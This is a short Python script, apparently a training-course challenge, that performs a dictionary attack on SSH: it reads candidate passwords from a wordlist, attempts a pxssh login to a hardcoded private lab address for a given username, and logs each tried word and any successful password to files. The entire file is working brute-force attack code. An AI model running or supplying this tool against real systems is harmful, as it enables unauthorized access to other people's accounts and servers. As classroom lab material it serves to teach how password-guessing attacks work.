#!/usr/bin/env python3
###########################
# Title: OpsChallenge27
# Author:Jeff Snyder
# Date: 11NOV2020
# Purpose: Dictionary attack against SSH connection
###########################
import smtplib
import itertools
import sys
import time
from pexpect import pxssh
import logging


def cracker(user, ipAddress, txtFile ):
    logger= logging.getLogger("BruteForce")
    c_handler=logging.FileHandler('report.txt')
    f_handler=logging.FileHandler('usedWords.txt')
    c_handler.setLevel(logging.ERROR)
    f_handler.setLevel(logging.WARNING)
    c_format=logging.Formatter('%(message)s')
    f_format =logging.Formatter('%(message)s')
    c_handler.setFormatter(c_format)
    f_handler.setFormatter(f_format)
    logger.addHandler(c_handler)
    logger.addHandler(f_handler)
    filepath =open(txtFile)
    for i in filepath.readlines():
        secret=i.strip("\n")
        print(secret)
        s=pxssh.pxssh()
        try:
            s.login(ipAddress, user, secret)
            logger.error("The password is "+ secret)
            break    
        except pxssh.ExceptionPxssh as e:
            logger.warning("Tried  " + secret)
            time.sleep(.5)
           
def main():
    
    print("Shall we play a game?")
    user=input("What is the username for the SSH connection?")
    ipAddress= "192.168.29.150"
    txtFile="./sample.txt"
    cracker(user, ipAddress, txtFile)  
main()